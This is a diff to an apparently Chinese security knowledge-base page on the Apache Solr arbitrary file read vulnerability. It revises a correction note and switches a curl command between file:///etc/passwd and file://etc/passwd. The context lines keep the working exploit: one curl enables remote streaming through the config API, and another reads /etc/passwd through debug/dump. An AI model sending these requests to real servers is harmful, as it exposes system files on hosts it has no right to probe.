@@ -30,7 +30,7 @@ canonical: "Web安全/中间件/Apache Solr/Apache Solr 任意文件读取漏洞
 
 ### 本次正文校订
 
-- 修正正文中的 file://etc/passwd → file:///etc/passwd 转录错误，资源路径保持原样。
+- 原示例按归档保留 file://etc/passwd；file:///etc/passwd 是此处的校订建议，不替换原始命令，资源路径保持原样。
 - 按实际内容修正 3 处代码围栏语言标记，保留其中方法与请求内容。
 
 ### 尚未解决的证据缺口
@@ -126,7 +126,7 @@ stream.url=file:///etc/passwd
 ```
 Curl请求为
 curl -d '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true\}\}' http://xxx.xxx.xxx.xxx:8983/solr/{corename}/config -H 'Content-type:application/json'
-curl "http://xxx.xxx.xxx.xxx:8983/solr/db/debug/dump?param=ContentStreams" -F "stream.url=file:///etc/passwd"
+curl "http://xxx.xxx.xxx.xxx:8983/solr/db/debug/dump?param=ContentStreams" -F "stream.url=file://etc/passwd"
 ```
 
 ****四:  漏洞 POC🦉****
